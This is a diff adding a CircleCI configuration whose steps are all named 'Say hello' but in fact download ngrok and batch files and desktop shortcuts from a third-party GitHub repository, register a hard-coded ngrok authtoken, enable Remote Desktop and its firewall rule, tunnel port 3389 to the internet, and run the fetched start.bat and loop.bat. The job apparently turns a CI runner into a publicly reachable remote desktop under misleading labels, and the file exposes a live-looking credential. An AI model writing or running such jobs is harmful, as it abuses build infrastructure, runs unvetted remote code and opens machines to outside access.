@@ -1,0 +1,37 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.2.0
+
+jobs:
+  say-hello:
+    executor: win/default
+    steps:
+      - checkout
+      - run:
+          name: "Say hello"
+          command: |
+            Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+            Invoke-WebRequest https://raw.githubusercontent.com/testhere1122/netslutter-RDP-1/master/start.bat -OutFile start.bat
+            Invoke-WebRequest https://raw.githubusercontent.com/testhere1122/netslutter-RDP-1/master/wallpaper.png -OutFile wallpaper.png
+            Invoke-WebRequest https://raw.githubusercontent.com/testhere1122/netslutter-RDP-1/master/wallpaper.bat -OutFile wallpaper.bat
+            Invoke-WebRequest https://raw.githubusercontent.com/testhere1122/netslutter-RDP-1/master/loop.bat -OutFile loop.bat
+            Invoke-WebRequest https://raw.githubusercontent.com/testhere1122/netslutter-RDP-1/master/launcher/Node.js.lnk -OutFile Node.js.lnk
+            Invoke-WebRequest https://raw.githubusercontent.com/testhere1122/netslutter-RDP-1/master/launcher/Visual%20Studio%202019.lnk -OutFile "Visual Studio 2019.lnk"
+            Expand-Archive ngrok.zip
+            .\ngrok\ngrok.exe authtoken 29C3mAi2P3YjfGCREzkDrt69H0Q_5mox3jh2gTRXQE8dZxeha
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+            Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+            copy wallpaper.png D:\a\wallpaper.png
+            copy wallpaper.bat D:\a\wallpaper.bat
+            copy Node.js.lnk C:\Users\Public\Desktop\Node.js.lnk
+            copy "Visual Studio 2019.lnk" "C:\Users\Public\Desktop\Visual Studio 2019.lnk"
+            Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
+            
+      - run:
+          name: "Say hello"
+          command: cmd /c start.bat
+      - run:
+          name: "Say hello"
+          command: cmd /c loop.bat
